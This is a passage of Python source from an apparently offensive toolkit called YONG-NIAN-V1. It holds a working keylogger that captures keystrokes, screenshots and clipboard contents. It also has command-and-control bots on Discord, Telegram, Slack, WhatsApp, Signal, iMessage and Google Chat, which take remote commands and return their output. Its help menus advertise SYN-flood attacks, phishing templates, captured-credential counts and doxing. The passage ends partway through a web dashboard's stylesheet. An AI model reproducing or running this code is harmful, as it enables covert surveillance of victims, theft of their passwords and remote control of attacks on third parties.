            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        """Save keylog"""
        if self.text:
            timestamp = datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
    
    def _take_screenshot(self) -> str:
        """Take screenshot"""
        try:
            import pyautogui
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_SCREENSHOTS_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        """Monitor clipboard"""
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.conn.execute(
                    "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                    (current[:5000], "keylogger")
                )
                self.db.conn.commit()
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _upload_keylog(self):
        """Upload keylog periodically"""
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        """Get keylogs"""
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        """Get screenshots"""
        try:
            return [f for f in os.listdir(KEYLOG_SCREENSHOTS_DIR) if f.startswith('screenshot_')]
        except:
            return []

# ============================================================
# BOT BASE CLASS
# ============================================================
class BaseBot(ABC):
    """Base class for all bots"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.running = False
        self.status = BotStatus.OFFLINE
        self.commands_processed = 0
        self.errors = 0
        self.last_activity = None
    
    @abstractmethod
    def setup(self) -> bool:
        """Setup the bot"""
        pass
    
    @abstractmethod
    def start(self):
        """Start the bot"""
        pass
    
    @abstractmethod
    def stop(self):
        """Stop the bot"""
        pass
    
    def execute_command(self, command: str, user_id: str = "unknown") -> Dict:
        """Execute a command"""
        try:
            result = self.handler.execute(command, self.get_platform_name(), user_id)
            self.commands_processed += 1
            self.last_activity = datetime.now().isoformat()
            
            if not result.get('success'):
                self.errors += 1
            
            self.db.update_bot_status(
                self.get_platform_name(),
                self.status.value,
                commands_processed=1,
                errors=0 if result.get('success') else 1
            )
            
            return result
        except Exception as e:
            self.errors += 1
            logger.error(f"Command execution error: {e}")
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @abstractmethod
    def get_platform_name(self) -> str:
        """Get platform name"""
        pass
    
    def get_status(self) -> Dict:
        """Get bot status"""
        return {
            'platform': self.get_platform_name(),
            'status': self.status.value,
            'running': self.running,
            'commands_processed': self.commands_processed,
            'errors': self.errors,
            'last_activity': self.last_activity
        }

# ============================================================
# DISCORD BOT
# ============================================================
class DiscordBot(BaseBot):
    """Discord bot implementation"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.bot = None
        self.token = config.get('discord.token', '')
        self.prefix = config.get('discord.prefix', '!')
    
    def get_platform_name(self) -> str:
        return "discord"
    
    def setup(self) -> bool:
        """Setup Discord bot"""
        if not DISCORD_AVAILABLE:
            logger.warning("Discord.py not available")
            return False
        
        if not self.token:
            logger.warning("Discord token not configured")
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        self.bot = commands.Bot(command_prefix=self.prefix, intents=intents)
        
        @self.bot.event
        async def on_ready():
            self.status = BotStatus.ONLINE
            self.running = True
            logger.info(f"Discord bot connected as {self.bot.user}")
            
            await self.bot.change_presence(
                activity=discord.Activity(type=discord.ActivityType.watching, name="YONG-NIAN-V1")
            )
            
            self.db.update_bot_status("discord", "online")
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            
            if message.content.startswith(self.prefix):
                cmd = message.content[len(self.prefix):].strip()
                
                if cmd.lower() == 'help':
                    await message.channel.send(self._get_help_embed())
                    return
                
                if cmd.lower() == 'commands':
                    await message.channel.send(self._get_commands_list())
                    return
                
                if cmd.lower() == 'status':
                    await message.channel.send(self._get_status_embed())
                    return
                
                result = self.execute_command(cmd, str(message.author.id))
                output = result.get('output', '')
                
                if len(output) > 1900:
                    chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
                    for chunk in chunks:
                        await message.channel.send(f"```{chunk}```")
                else:
                    await message.channel.send(f"```{output}```")
            
            await self.bot.process_commands(message)
        
        return True
    
    def start(self):
        """Start Discord bot"""
        if not self.bot:
            if not self.setup():
                return
        
        try:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            self.status = BotStatus.ERROR
    
    def _run(self):
        """Run Discord bot"""
        try:
            self.status = BotStatus.CONNECTING
            asyncio.run(self.bot.start(self.token))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            self.status = BotStatus.ERROR
            self.running = False
    
    def stop(self):
        """Stop Discord bot"""
        self.running = False
        if self.bot:
            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("discord", "offline")
    
    def _get_help_embed(self) -> str:
        return """
🔷 **YONG-NIAN-V1 - DISCORD COMMANDS**
════════════════════════════════════════

**Available Commands:**
`!help` - Show this help message
`!commands` - List all available commands
`!status` - Show bot status

**Command Categories:**
• 📡 Ping - `!ping <target>`
• 🗺️ Traceroute - `!traceroute <target>`
• 🔍 Nmap - `!nmap <target>`
• 🌐 Curl - `!curl <url>`
• ⬇️ Wget - `!wget <url>`
• 🔌 Netcat - `!nc <host> <port>`
• 🔒 SSH - `!ssh_list`
• 💥 DOS - `!dos_syn <ip> <port> <dur>`
• 🎣 Phishing - `!phish_facebook`
• ⌨️ Keylogger - `!keylogger_start`
• 🔬 Binary - `!binary_analyze <file>`
• 📱 APK - `!apk_analyze <file>`
• 🛤️ Attack Path - `!attack_path <target>`
• 🤖 LLM - `!llm <question>`

Type `!help <category>` for details on a specific category.
"""
    
    def _get_commands_list(self) -> str:
        categories = {
            'ping': 'Ping commands (30+)',
            'traceroute': 'Traceroute commands (35+)',
            'nmap': 'Nmap commands (80+)',
            'curl': 'Curl commands (80+)',
            'wget': 'Wget commands (70+)',
            'nc': 'Netcat commands (25+)',
            'ssh': 'SSH commands (15+)',
            'dos': 'DOS/DDOS commands',
            'phish': 'Phishing commands (100+ templates)',
            'keylogger': 'Keylogger commands',
            'binary': 'Binary analysis commands',
            'apk': 'APK analysis commands',
            'attack_path': 'Attack path commands (Dijkstra)',
            'llm': 'LLM commands',
            'dox': 'DOX commands',
            'stego': 'Steganography commands',
            'encrypt': 'Encryption commands',
            'system': 'System commands'
        }
        
        output = "📋 **AVAILABLE COMMAND CATEGORIES**\n" + "=" * 40 + "\n\n"
        for cat, desc in categories.items():
            output += f"• `!help {cat}` - {desc}\n"
        
        return output
    
    def _get_status_embed(self) -> str:
        stats = self.db.get_statistics()
        return f"""
🔷 **YONG-NIAN-V1 STATUS**
{'='*40}

**Bot Status:** 🟢 Online
**Commands Processed:** {self.commands_processed}
**Errors:** {self.errors}

**System Statistics:**
• Total Commands: {stats.get('total_commands', 0)}
• Total Threats: {stats.get('total_threats', 0)}
• Managed IPs: {stats.get('total_managed_ips', 0)}
• Phishing Links: {stats.get('total_phishing_links', 0)}
• Captured Credentials: {stats.get('captured_credentials', 0)}
• Binary Analyses: {stats.get('total_binary_analyses', 0)}
• APK Analyses: {stats.get('total_apk_analyses', 0)}
• Attack Paths: {stats.get('total_attack_paths', 0)}
"""

# ============================================================
# TELEGRAM BOT
# ============================================================
class TelegramBot(BaseBot):
    """Telegram bot implementation"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.client = None
        self.token = config.get('telegram.bot_token', '')
        self.chat_id = config.get('telegram.chat_id', '')
        self.prefix = config.get('telegram.prefix', '/')
    
    def get_platform_name(self) -> str:
        return "telegram"
    
    def setup(self) -> bool:
        """Setup Telegram bot"""
        if not TELETHON_AVAILABLE:
            logger.warning("Telethon not available")
            return False
        
        if not self.token:
            logger.warning("Telegram token not configured")
            return False
        
        return True
    
    def start(self):
        """Start Telegram bot"""
        if not self.setup():
            return
        
        try:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            self.status = BotStatus.ERROR
    
    def _run(self):
        """Run Telegram bot"""
        try:
            self.status = BotStatus.CONNECTING
            
            async def main():
                self.client = TelegramClient('yong_nian_session', 1, 'dummy')
                await self.client.start(bot_token=self.token)
                
                self.status = BotStatus.ONLINE
                self.running = True
                logger.info("Telegram bot connected")
                self.db.update_bot_status("telegram", "online")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.prefix):
                        cmd = event.message.text[len(self.prefix):].strip()
                        
                        if cmd.lower() == 'help':
                            await event.reply(self._get_help_message())
                            return
                        
                        if cmd.lower() == 'commands':
                            await event.reply(self._get_commands_list())
                            return
                        
                        if cmd.lower() == 'status':
                            await event.reply(self._get_status_message())
                            return
                        
                        result = self.execute_command(cmd, str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```\n{output}\n```")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
            self.status = BotStatus.ERROR
            self.running = False
    
    def stop(self):
        """Stop Telegram bot"""
        self.running = False
        if self.client:
            asyncio.run_coroutine_threadsafe(self.client.disconnect(), self.client.loop)
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("telegram", "offline")
    
    def _get_help_message(self) -> str:
        return """
🔷 **YONG-NIAN-V1 - TELEGRAM COMMANDS**
════════════════════════════════════════

**Available Commands:**
/help - Show this help message
/commands - List all available commands
/status - Show bot status

**Command Categories:**
• 📡 Ping - /ping <target>
• 🗺️ Traceroute - /traceroute <target>
• 🔍 Nmap - /nmap <target>
• 🌐 Curl - /curl <url>
• ⬇️ Wget - /wget <url>
• 🔌 Netcat - /nc <host> <port>
• 🔒 SSH - /ssh_list
• 💥 DOS - /dos_syn <ip> <port> <dur>
• 🎣 Phishing - /phish_facebook
• ⌨️ Keylogger - /keylogger_start
• 🔬 Binary - /binary_analyze <file>
• 📱 APK - /apk_analyze <file>
• 🛤️ Attack Path - /attack_path <target>
• 🤖 LLM - /llm <question>

Type /help <category> for details on a specific category.
"""
    
    def _get_commands_list(self) -> str:
        categories = {
            'ping': 'Ping commands (30+)',
            'traceroute': 'Traceroute commands (35+)',
            'nmap': 'Nmap commands (80+)',
            'curl': 'Curl commands (80+)',
            'wget': 'Wget commands (70+)',
            'nc': 'Netcat commands (25+)',
            'ssh': 'SSH commands (15+)',
            'dos': 'DOS/DDOS commands',
            'phish': 'Phishing commands (100+ templates)',
            'keylogger': 'Keylogger commands',
            'binary': 'Binary analysis commands',
            'apk': 'APK analysis commands',
            'attack_path': 'Attack path commands (Dijkstra)',
            'llm': 'LLM commands',
            'dox': 'DOX commands',
            'stego': 'Steganography commands',
            'encrypt': 'Encryption commands',
            'system': 'System commands'
        }
        
        output = "📋 **AVAILABLE COMMAND CATEGORIES**\n" + "=" * 40 + "\n\n"
        for cat, desc in categories.items():
            output += f"• /help {cat} - {desc}\n"
        
        return output
    
    def _get_status_message(self) -> str:
        stats = self.db.get_statistics()
        return f"""
🔷 **YONG-NIAN-V1 STATUS**
{'='*40}

**Bot Status:** 🟢 Online
**Commands Processed:** {self.commands_processed}
**Errors:** {self.errors}

**System Statistics:**
• Total Commands: {stats.get('total_commands', 0)}
• Total Threats: {stats.get('total_threats', 0)}
• Managed IPs: {stats.get('total_managed_ips', 0)}
• Phishing Links: {stats.get('total_phishing_links', 0)}
• Captured Credentials: {stats.get('captured_credentials', 0)}
"""

# ============================================================
# SLACK BOT
# ============================================================
class SlackBot(BaseBot):
    """Slack bot implementation"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.client = None
        self.token = config.get('slack.bot_token', '')
        self.channel_id = config.get('slack.channel_id', '')
        self.prefix = config.get('slack.prefix', '!')
    
    def get_platform_name(self) -> str:
        return "slack"
    
    def setup(self) -> bool:
        """Setup Slack bot"""
        if not SLACK_AVAILABLE:
            logger.warning("Slack SDK not available")
            return False
        
        if not self.token:
            logger.warning("Slack token not configured")
            return False
        
        self.client = WebClient(token=self.token)
        return True
    
    def start(self):
        """Start Slack bot"""
        if not self.setup():
            return
        
        try:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.status = BotStatus.ONLINE
            self.running = True
            self.db.update_bot_status("slack", "online")
        except Exception as e:
            logger.error(f"Failed to start Slack bot: {e}")
            self.status = BotStatus.ERROR
    
    def _monitor(self):
        """Monitor Slack for commands"""
        last_ts = {}
        channel = self.channel_id or 'general'
        
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=10)
                
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.prefix):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.prefix):].strip()
                                
                                if cmd.lower() == 'help':
                                    self.send_message(self._get_help_message())
                                    continue
                                
                                if cmd.lower() == 'commands':
                                    self.send_message(self._get_commands_list())
                                    continue
                                
                                if cmd.lower() == 'status':
                                    self.send_message(self._get_status_message())
                                    continue
                                
                                result = self.execute_command(cmd, msg.get('user', 'unknown'))
                                self.send_message(f"```{result.get('output', '')[:2000]}```")
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def stop(self):
        """Stop Slack bot"""
        self.running = False
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("slack", "offline")
    
    def send_message(self, message: str):
        """Send message to Slack"""
        if self.client:
            try:
                self.client.chat_postMessage(
                    channel=self.channel_id or 'general',
                    text=message[:4000]
                )
            except:
                pass
    
    def _get_help_message(self) -> str:
        return """
🔷 **YONG-NIAN-V1 - SLACK COMMANDS**
════════════════════════════════════════

**Available Commands:**
!help - Show this help message
!commands - List all available commands
!status - Show bot status

**Command Categories:**
• 📡 Ping - !ping <target>
• 🗺️ Traceroute - !traceroute <target>
• 🔍 Nmap - !nmap <target>
• 🌐 Curl - !curl <url>
• ⬇️ Wget - !wget <url>
• 🔌 Netcat - !nc <host> <port>
• 🔒 SSH - !ssh_list
• 💥 DOS - !dos_syn <ip> <port> <dur>
• 🎣 Phishing - !phish_facebook
• ⌨️ Keylogger - !keylogger_start
• 🔬 Binary - !binary_analyze <file>
• 📱 APK - !apk_analyze <file>
• 🛤️ Attack Path - !attack_path <target>
• 🤖 LLM - !llm <question>
"""
    
    def _get_commands_list(self) -> str:
        categories = {
            'ping': 'Ping commands (30+)',
            'traceroute': 'Traceroute commands (35+)',
            'nmap': 'Nmap commands (80+)',
            'curl': 'Curl commands (80+)',
            'wget': 'Wget commands (70+)',
            'nc': 'Netcat commands (25+)',
            'ssh': 'SSH commands (15+)',
            'dos': 'DOS/DDOS commands',
            'phish': 'Phishing commands (100+ templates)',
            'keylogger': 'Keylogger commands',
            'binary': 'Binary analysis commands',
            'apk': 'APK analysis commands',
            'attack_path': 'Attack path commands (Dijkstra)',
            'llm': 'LLM commands',
            'dox': 'DOX commands',
            'stego': 'Steganography commands',
            'encrypt': 'Encryption commands',
            'system': 'System commands'
        }
        
        output = "📋 **AVAILABLE COMMAND CATEGORIES**\n" + "=" * 40 + "\n\n"
        for cat, desc in categories.items():
            output += f"• !help {cat} - {desc}\n"
        
        return output
    
    def _get_status_message(self) -> str:
        stats = self.db.get_statistics()
        return f"""
🔷 **YONG-NIAN-V1 STATUS**
{'='*40}

**Bot Status:** 🟢 Online
**Commands Processed:** {self.commands_processed}
**Errors:** {self.errors}

**System Statistics:**
• Total Commands: {stats.get('total_commands', 0)}
• Total Threats: {stats.get('total_threats', 0)}
• Managed IPs: {stats.get('total_managed_ips', 0)}
• Phishing Links: {stats.get('total_phishing_links', 0)}
• Captured Credentials: {stats.get('captured_credentials', 0)}
"""

# ============================================================
# WHATSAPP BOT
# ============================================================
class WhatsAppBot(BaseBot):
    """WhatsApp bot implementation using Selenium"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.driver = None
        self.phone_number = config.get('whatsapp.phone_number', '')
        self.prefix = config.get('whatsapp.prefix', '!')
    
    def get_platform_name(self) -> str:
        return "whatsapp"
    
    def setup(self) -> bool:
        """Setup WhatsApp bot"""
        if not SELENIUM_AVAILABLE:
            logger.warning("Selenium not available")
            return False
        
        if not WEBDRIVER_MANAGER_AVAILABLE:
            logger.warning("WebDriver Manager not available")
            return False
        
        return True
    
    def start(self):
        """Start WhatsApp bot"""
        if not self.setup():
            return
        
        try:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
        except Exception as e:
            logger.error(f"Failed to start WhatsApp bot: {e}")
            self.status = BotStatus.ERROR
    
    def _run(self):
        """Run WhatsApp bot"""
        try:
            self.status = BotStatus.CONNECTING
            
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            
            self.driver.get('https://web.whatsapp.com')
            
            print(f"{Colors.WARNING}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            
            time.sleep(20)
            
            self.status = BotStatus.ONLINE
            self.running = True
            self.db.update_bot_status("whatsapp", "online")
            
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
            
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")
            self.status = BotStatus.ERROR
            self.running = False
    
    def stop(self):
        """Stop WhatsApp bot"""
        self.running = False
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("whatsapp", "offline")
    
    def send_message(self, message: str):
        """Send message via WhatsApp"""
        if self.driver and self.phone_number:
            try:
                url = f"https://web.whatsapp.com/send?phone={self.phone_number}&text={urllib.parse.quote(message[:4000])}"
                self.driver.get(url)
                time.sleep(3)
            except:
                pass

# ============================================================
# SIGNAL BOT
# ============================================================
class SignalBot(BaseBot):
    """Signal bot implementation using signal-cli"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.phone_number = config.get('signal.phone_number', '')
        self.group_id = config.get('signal.group_id', '')
        self.prefix = config.get('signal.prefix', '!')
    
    def get_platform_name(self) -> str:
        return "signal"
    
    def setup(self) -> bool:
        """Setup Signal bot"""
        if not SIGNAL_AVAILABLE:
            logger.warning("signal-cli not available")
            return False
        
        if not self.phone_number:
            logger.warning("Signal phone number not configured")
            return False
        
        return True
    
    def start(self):
        """Start Signal bot"""
        if not self.setup():
            return
        
        try:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.status = BotStatus.ONLINE
            self.running = True
            self.db.update_bot_status("signal", "online")
        except Exception as e:
            logger.error(f"Failed to start Signal bot: {e}")
            self.status = BotStatus.ERROR
    
    def _monitor(self):
        """Monitor Signal for messages"""
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.phone_number],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.prefix):
                                cmd = msg[len(self.prefix):].strip()
                                
                                if cmd.lower() == 'help':
                                    self._send_message(self._get_help_message())
                                    continue
                                
                                if cmd.lower() == 'commands':
                                    self._send_message(self._get_commands_list())
                                    continue
                                
                                if cmd.lower() == 'status':
                                    self._send_message(self._get_status_message())
                                    continue
                                
                                result = self.execute_command(cmd, 'signal_user')
                                self._send_message(result.get('output', '')[:4000])
                
                time.sleep(5)
            except Exception as e:
                logger.error(f"Signal monitor error: {e}")
                time.sleep(10)
    
    def stop(self):
        """Stop Signal bot"""
        self.running = False
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("signal", "offline")
    
    def _send_message(self, message: str):
        """Send message via Signal"""
        try:
            cmd = ['signal-cli', 'send', '--number', self.phone_number]
            if self.group_id:
                cmd.extend(['--group', self.group_id])
            cmd.extend(['--message', message[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass
    
    def _get_help_message(self) -> str:
        return """
🔷 **YONG-NIAN-V1 - SIGNAL COMMANDS**
════════════════════════════════════════

**Available Commands:**
!help - Show this help message
!commands - List all available commands
!status - Show bot status

**Command Categories:**
• 📡 Ping - !ping <target>
• 🗺️ Traceroute - !traceroute <target>
• 🔍 Nmap - !nmap <target>
• 🌐 Curl - !curl <url>
• ⬇️ Wget - !wget <url>
• 🔌 Netcat - !nc <host> <port>
• 🔒 SSH - !ssh_list
• 💥 DOS - !dos_syn <ip> <port> <dur>
• 🎣 Phishing - !phish_facebook
• ⌨️ Keylogger - !keylogger_start
• 🔬 Binary - !binary_analyze <file>
• 📱 APK - !apk_analyze <file>
• 🛤️ Attack Path - !attack_path <target>
• 🤖 LLM - !llm <question>
"""
    
    def _get_commands_list(self) -> str:
        categories = {
            'ping': 'Ping commands (30+)',
            'traceroute': 'Traceroute commands (35+)',
            'nmap': 'Nmap commands (80+)',
            'curl': 'Curl commands (80+)',
            'wget': 'Wget commands (70+)',
            'nc': 'Netcat commands (25+)',
            'ssh': 'SSH commands (15+)',
            'dos': 'DOS/DDOS commands',
            'phish': 'Phishing commands (100+ templates)',
            'keylogger': 'Keylogger commands',
            'binary': 'Binary analysis commands',
            'apk': 'APK analysis commands',
            'attack_path': 'Attack path commands (Dijkstra)',
            'llm': 'LLM commands',
            'dox': 'DOX commands',
            'stego': 'Steganography commands',
            'encrypt': 'Encryption commands',
            'system': 'System commands'
        }
        
        output = "📋 **AVAILABLE COMMAND CATEGORIES**\n" + "=" * 40 + "\n\n"
        for cat, desc in categories.items():
            output += f"• !help {cat} - {desc}\n"
        
        return output
    
    def _get_status_message(self) -> str:
        stats = self.db.get_statistics()
        return f"""
🔷 **YONG-NIAN-V1 STATUS**
{'='*40}

**Bot Status:** 🟢 Online
**Commands Processed:** {self.commands_processed}
**Errors:** {self.errors}

**System Statistics:**
• Total Commands: {stats.get('total_commands', 0)}
• Total Threats: {stats.get('total_threats', 0)}
• Managed IPs: {stats.get('total_managed_ips', 0)}
• Phishing Links: {stats.get('total_phishing_links', 0)}
• Captured Credentials: {stats.get('captured_credentials', 0)}
"""

# ============================================================
# IMESSAGE BOT
# ============================================================
class iMessageBot(BaseBot):
    """iMessage bot implementation (macOS only)"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.phone_numbers = config.get('imessage.phone_numbers', [])
        self.prefix = config.get('imessage.prefix', '!')
    
    def get_platform_name(self) -> str:
        return "imessage"
    
    def setup(self) -> bool:
        """Setup iMessage bot"""
        if not IMESSAGE_AVAILABLE:
            logger.warning("iMessage only available on macOS")
            return False
        
        if not self.phone_numbers:
            logger.warning("iMessage phone numbers not configured")
            return False
        
        return True
    
    def start(self):
        """Start iMessage bot"""
        if not self.setup():
            return
        
        try:
            self.status = BotStatus.ONLINE
            self.running = True
            self.db.update_bot_status("imessage", "online")
            logger.info("iMessage bot started")
        except Exception as e:
            logger.error(f"Failed to start iMessage bot: {e}")
            self.status = BotStatus.ERROR
    
    def stop(self):
        """Stop iMessage bot"""
        self.running = False
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("imessage", "offline")
    
    def send_message(self, message: str):
        """Send message via iMessage"""
        if not IMESSAGE_AVAILABLE:
            return
        
        try:
            for phone in self.phone_numbers:
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{message[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except:
            pass

# ============================================================
# GOOGLE CHAT BOT
# ============================================================
class GoogleChatBot(BaseBot):
    """Google Chat bot implementation"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        super().__init__(handler, db, config)
        self.webhook_url = config.get('google_chat.webhook_url', '')
        self.space_id = config.get('google_chat.space_id', '')
        self.prefix = config.get('google_chat.prefix', '/')
    
    def get_platform_name(self) -> str:
        return "google_chat"
    
    def setup(self) -> bool:
        """Setup Google Chat bot"""
        if not self.webhook_url:
            logger.warning("Google Chat webhook URL not configured")
            return False
        
        return True
    
    def start(self):
        """Start Google Chat bot"""
        if not self.setup():
            return
        
        try:
            self.status = BotStatus.ONLINE
            self.running = True
            self.db.update_bot_status("google_chat", "online")
            logger.info("Google Chat bot started")
        except Exception as e:
            logger.error(f"Failed to start Google Chat bot: {e}")
            self.status = BotStatus.ERROR
    
    def stop(self):
        """Stop Google Chat bot"""
        self.running = False
        self.status = BotStatus.OFFLINE
        self.db.update_bot_status("google_chat", "offline")
    
    def send_message(self, message: str):
        """Send message via Google Chat"""
        if not self.webhook_url:
            return
        
        try:
            data = {'text': message[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.webhook_url, json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False

# ============================================================
# WEB DASHBOARD
# ============================================================
class WebDashboard:
    """Web dashboard for YONG-NIAN-V1"""
    
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        """Create Flask application"""
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = secrets.token_hex(32)
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔷 YONG-NIAN-V1 - Cybersecurity Dashboard</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { 
            --cyan: #00ffff;
            --dark-cyan: #008b8b;
            --light-cyan: #7fffff;
            --dark: #0a0a1a; 
            --darker: #050510; 
            --light: #ffffff;
            --success: #00ff00;
            --warning: #ffaa00;
        }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 50%, #1a1a3a 100%);
            color: var(--light); 
            min-height: 100vh;
        }
        .header { 
            background: linear-gradient(135deg, #0a1a3a 0%, var(--dark-cyan) 50%, var(--cyan) 100%);
            padding: 20px; 
            text-align: center; 
            box-shadow: 0 4px 30px rgba(0, 255, 255, 0.3);
        }
        .header h1 { 
            font-size: 2.5em; 
            text-shadow: 0 0 30px rgba(0, 255, 255, 0.6); 
            letter-spacing: 5px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 30px rgba(0, 255, 255, 0.6); }
            50% { text-shadow: 0 0 60px rgba(0, 255, 255, 1); }
        }
        .header p { opacity: 0.8; margin-top: 10px; font-size: 1.1em; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); 
            gap: 15px; 
            margin-bottom: 30px;
        }
        .stat-card { 
            background: linear-gradient(135deg, rgba(0, 139, 139, 0.2), rgba(0, 255, 255, 0.1));
            border: 2px solid rgba(0, 255, 255, 0.3);
            border-radius: 12px; 
            padding: 20px; 
            text-align: center; 
            transition: all 0.3s;
        }
        .stat-card:hover { 
            border-color: var(--cyan); 
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.5); 
            transform: translateY(-5px);
        }
        .stat-card h3 { font-size: 2.2em; color: var(--cyan); margin-bottom: 5px; text-shadow: 0 0 20px rgba(0,255,255,0.5); }
        .stat-card p { color: rgba(255, 255, 255, 0.7); font-size: 0.9em; }
        .section { 
            background: linear-gradient(135deg, rgba(0, 139, 139, 0.1), rgba(0, 0, 0, 0.3));
            border: 2px solid rgba(0, 255, 255, 0.2);
            border-radius: 12px; 
            padding: 25px; 
            margin-bottom: 20px;
        }
        .section h2 { 
            color: var(--cyan); 
            margin-bottom: 20px; 
            padding-bottom: 10px; 
            border-bottom: 2px solid rgba(0, 255, 255, 0.3);
            font-size: 1.3em;
        }
        .command-input { 
            width: 100%; 
            padding: 15px; 
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(0, 255, 255, 0.3); 
            border-radius: 8px; 
            color: white; 
            font-size: 16px; 
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }
        .command-input:focus { 
            outline: none; 
            border-color: var(--cyan); 
